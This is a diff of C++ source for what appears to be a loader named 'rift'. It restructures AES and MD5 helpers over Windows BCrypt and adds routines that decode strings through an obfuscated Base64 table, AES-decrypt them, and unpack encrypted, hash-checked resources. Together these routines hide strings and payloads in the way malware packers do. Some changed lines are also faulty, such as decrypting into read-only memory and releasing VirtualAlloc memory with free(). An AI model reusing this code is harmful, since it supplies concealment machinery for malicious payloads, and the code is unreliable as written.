@@ -1,70 +1,68 @@
 #include "_riftldr.h"
 
 namespace cry {
-	class Aes {
-	public:
-		Aes(
-			_In_     void* pBlob,
-			_In_opt_ Aes* pIKey = nullptr
-		) {
-			if (!s_ah && !s_nRefCount)
-				NTSTATUS nts = BCryptOpenAlgorithmProvider(&s_ah, BCRYPT_AES_ALGORITHM, nullptr, NULL);
-			status s;
-			if (!s_nObj) {
-				size_t nResult;
-				s = BCryptGetProperty(s_ah, BCRYPT_OBJECT_LENGTH, (static*)&s_nObj, sizeof(dword), (ulong*)&nResult, NULL);
-			}
-			m_pObj = malloc(s_nObj);
-			if (!pIKey)
-				s = BCryptImportKey(s_ah, NULL, BCRYPT_KEY_DATA_BLOB, &m_kh, (static*)m_pObj, s_nObj, (static*)pBlob, AES_BLOB_SIZE, NULL);
-			else
-				s = BCryptImportKey(s_ah, pIKey->m_kh, BCRYPT_AES_WRAP_KEY_BLOB, &m_kh, (static*)m_pObj, s_nObj, (static*)pBlob, AES_WARPED_SIZE, NULL);
-			s_nRefCount++;
+	BCRYPT_ALG_HANDLE Aes::s_ah;
+	size_t Aes::s_nObj;
+	int Aes::s_nRefCount;
+
+	Aes::Aes(
+		_In_     void* pBlob,
+		_In_opt_ Aes*  pIKey
+	) {
+		if (!s_ah && !s_nRefCount)
+			NTSTATUS nts = BCryptOpenAlgorithmProvider(&s_ah, BCRYPT_AES_ALGORITHM, nullptr, NULL);
+		status s;
+		if (!s_nObj) {
+			size_t nResult;
+			s = BCryptGetProperty(s_ah, BCRYPT_OBJECT_LENGTH, (uchar*)&s_nObj, sizeof(dword), (ulong*)&nResult, NULL);
 		}
-		~Aes() {
-			status s = BCryptDestroyKey(m_kh);
-			SecureZeroMemory(m_pObj, s_nObj);
-			free(m_pObj);
-			if (!--s_nRefCount)
-				s = BCryptCloseAlgorithmProvider(s_ah, NULL);
+		m_pObj = malloc(s_nObj);
+		if (!pIKey)
+			s = BCryptImportKey(s_ah, NULL, BCRYPT_KEY_DATA_BLOB, &m_kh, (uchar*)m_pObj, s_nObj, (uchar*)pBlob, AES_BLOB_SIZE, NULL);
+		else
+			s = BCryptImportKey(s_ah, pIKey->m_kh, BCRYPT_AES_WRAP_KEY_BLOB, &m_kh, (uchar*)m_pObj, s_nObj, (uchar*)pBlob, AES_WARPED_SIZE, NULL);
+		s_nRefCount++;
+	}
+	Aes::~Aes() {
+		status s = BCryptDestroyKey(m_kh);
+		SecureZeroMemory(m_pObj, s_nObj);
+		free(m_pObj);
+		if (!--s_nRefCount)
+			s = BCryptCloseAlgorithmProvider(s_ah, NULL);
+	}
+
+	// TODO: this has to be implemented and adapted to the new c++ class model for rift
+	VOID Aes::IWrapKey(
+		_In_  const Aes& pWrap,
+		_Out_ void* pBlob
+	) {}
+	status Aes::IValidateKey( // Checks if a Key can decrypt sampledata without opening a plaintext attack
+		_In_ void* pData      // Sampledata to Decrypt (has to be 512-Bytes in total)
+	) {
+		return 0;
+	}
+
+	/* Internal Decryption Subroutine */
+	void* Aes::IAesDecrypt(
+		_In_  void*   pData,
+		_In_  size_t  nData,
+		_In_  void*   pIv,
+		_Out_ size_t* nResult
+	) {
+		NTSTATUS nts = BCryptDecrypt(m_kh, (uchar*)pData, nData, nullptr, (uchar*)pIv, 16, NULL, 0, (ulong*)nResult, NULL);
+		if (nts)
+			return NULL;
+
+		// void* pDecrypted = malloc(*nResult);
+		void* pDecrypted = VirtualAlloc(nullptr, *nResult, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY);
+		nts = BCryptDecrypt(m_kh, (uchar*)pData, nData, nullptr, (uchar*)pIv, 16, (uchar*)pDecrypted, *nResult, (ulong*)nResult, NULL);
+		if (nts) {
+			free(pDecrypted);
+			return NULL;
 		}
 
-		// TODO: this has to be implemented and adapted to the new c++ class model for rift
-		VOID IWrapKey(
-			_In_  const Aes& pWrap,
-			_Out_ void* pBlob
-		) {}
-		status IValidateKey( // Checks if a Key can decrypt sampledata without opening a plaintext attack
-			_In_ void* pData // Sampledata to Decrypt (has to be 512-Bytes in total)
-		) {}
-
-		/* Internal Decryption Subroutine */
-		void* IAesDecrypt(
-			_In_  void* pData,
-			_In_  size_t  nData,
-			_In_  void* pIv,
-			_Out_ size_t* nResult
-		) {
-			NTSTATUS nts = BCryptDecrypt(m_kh, (static*)pData, nData, nullptr, (static*)pIv, 16, NULL, 0, (ulong*)nResult, NULL);
-			if (nts)
-				return NULL;
-
-			void* pDecrypted = malloc(*nResult);
-			nts = BCryptDecrypt(m_kh, (static*)pData, nData, nullptr, (static*)pIv, 16, (static*)pDecrypted, *nResult, (ulong*)nResult, NULL);
-			if (nts) {
-				free(pDecrypted);
-				return NULL;
-			}
-
-			return pDecrypted;
-		}
-	private:
-		static BCRYPT_ALG_HANDLE s_ah;
-		static size_t s_nObj;
-		static int s_nRefCount;
-		BCRYPT_KEY_HANDLE m_kh;
-		void* m_pObj;
-	};
+		return pDecrypted;
+	}
 
 	VOID IConvertKeyToBlob(
 		_In_  uuid* pKey,
@@ -83,11 +81,16 @@ namespace cry {
 		_Out_ size_t* nResult
 	) {
 		StringCchLengthA(pString, STRSAFE_MAX_CCH, nResult);
-		void* pData = EBase64DecodeA(pString, *nResult, nResult);
+		alg::Base64 b64(alg::IBase64ObfuscatedTableCbA);
+		status nData = b64.EBase64DecodeA(pString, *nResult, nullptr);
+		void* pData = nullptr;
+		if (!(nData < 0))
+			pData = malloc(nData);
+		b64.EBase64DecodeA(pString, *nResult, pData);
 
 		void* pIv = malloc(16);
 		ZeroMemory(pIv, 16);
-		PCWSTR sz = (PCWSTR)(g_PIB->sCIB.WK->IAesDecrypt(pData, *nResult, pIv, nResult));
+		PCWSTR sz = (PCWSTR)(g_PIB->sCry.EK->IAesDecrypt(pData, *nResult, pIv, nResult));
 		free(pIv);
 		free(pData);
 
@@ -115,17 +118,17 @@ namespace cry {
 		return NULL;
 	}
 	void* EUnpackResource(
-		_In_  word      wResID,
-		_Out_ size_t*   nData,
-		_In_  cry::Aes& waes = *g_PIB->sCIB.WK
+		_In_  word    wResID,
+		_Out_ size_t* nData,
+		_In_  Aes*    waes // = g_PIB->sCry.EK
 	) {
 		// Load Packed Resource
-		void* pResource = ELoadResourceW(wResID, L"RT_RCDATA", (SIZE_T*)nData);
+		void* pResource = utl::ELoadResourceW(wResID, L"RT_RCDATA", nData);
 		if (!pResource)
 			return NULL;
 
 		// Unwarp Key and Import it
-		auto* aes = new cry::Aes(((AESIB*)pResource)->Key, &waes);
+		auto* aes = new Aes(((AESIB*)pResource)->Key, waes);
 
 		// Decrypt Data
 		void* pIv = malloc(16);
@@ -144,63 +147,54 @@ namespace cry {
 		Md5 pHash;
 		pHash.EHashData(pData, *nData);
 		pHash.EFnialize();
-		if (!memcmp(&pHash.EGetHash(), &((AESIB*)pResource)->Md5, 16))
+		if (pHash.pMd5 == (md5)(((AESIB*)pResource)->Md5))
 			return pData;
-		VirtualFree(pData, *nData, MEM_RELEASE);
+		VirtualFree(pData, NULL, MEM_RELEASE);
 		return NULL;
 	}
 
-	class Md5 {
-	public:
-		Md5() {
-			status s;
-			if (!s_ah && !s_nRefCount)
-				s = BCryptOpenAlgorithmProvider(&s_ah, BCRYPT_MD5_ALGORITHM, nullptr, NULL);
-			if (!s_nObj) {
-				size_t nResult;
-				s = BCryptGetProperty(s_ah, BCRYPT_OBJECT_LENGTH, (static*)&s_nObj, sizeof(dword), (ulong*)&nResult, NULL);
-			}
-			m_pObj = malloc(s_nObj);
-			s_nRefCount++;
-		}
-		~Md5() {
-			status s;
-			if (m_hh)
-				s = BCryptDestroyHash(m_hh);
-			free(m_pObj);
-			if (!--s_nRefCount)
-				s = BCryptCloseAlgorithmProvider(s_ah, NULL);
-		}
 
-		status EHashData(
-			_In_ void* pBuffer,
-			_In_ size_t nBuffer
-		) {
-			status s;
-			if (!m_hh)
-				s = BCryptCreateHash(s_ah, &m_hh, (static*)m_pObj, s_nObj, nullptr, 0, NULL);
-			s = BCryptHashData(m_hh, (static*)pBuffer, nBuffer, NULL);
-			return s;
+
+	BCRYPT_ALG_HANDLE Md5::s_ah;
+	int Md5::s_nRefCount;
+	size_t Md5::s_nObj;
+
+	Md5::Md5() {
+		status s;
+		if (!s_ah && !s_nRefCount)
+			s = BCryptOpenAlgorithmProvider(&s_ah, BCRYPT_MD5_ALGORITHM, nullptr, NULL);
+		if (!s_nObj) {
+			size_t nResult;
+			s = BCryptGetProperty(s_ah, BCRYPT_OBJECT_LENGTH, (uchar*)&s_nObj, sizeof(dword), (ulong*)&nResult, NULL);
 		}
-		status EFnialize() {
-			if (!m_pMd5)
-				m_pMd5 = (md5*)malloc(sizeof(md5));
-			status s = BCryptFinishHash(m_hh, (static*)m_pMd5, sizeof(md5), NULL);
+		m_pObj = malloc(s_nObj);
+		s_nRefCount++;
+	}
+	Md5::~Md5() {
+		status s;
+		if (m_hh)
 			s = BCryptDestroyHash(m_hh);
-			m_hh = NULL;
-			return s;
-		}
-		md5& EGetHash() {
-			return *m_pMd5;
-		}
-	private:
-		static BCRYPT_ALG_HANDLE s_ah;
-		static int s_nRefCount;
-		static size_t s_nObj;
-		BCRYPT_HASH_HANDLE m_hh;
-		void* m_pObj;
-		md5* m_pMd5;
-	};
+		free(m_pObj);
+		if (!--s_nRefCount)
+			s = BCryptCloseAlgorithmProvider(s_ah, NULL);
+	}
+
+	status Md5::EHashData(
+		_In_ void* pBuffer,
+		_In_ size_t nBuffer
+	) {
+		status s;
+		if (!m_hh)
+			s = BCryptCreateHash(s_ah, &m_hh, (uchar*)m_pObj, s_nObj, nullptr, 0, NULL);
+		s = BCryptHashData(m_hh, (uchar*)pBuffer, nBuffer, NULL);
+		return s;
+	}
+	status Md5::EFnialize() {
+		status s = BCryptFinishHash(m_hh, (uchar*)&m_pMd5, sizeof(md5), NULL);
+		s = BCryptDestroyHash(m_hh);
+		m_hh = NULL;
+		return s;
+	}
 
 #if 0 // already implemented in guiddef.h
 	bool ::operator==(const md5& rL, const md5& rR) {
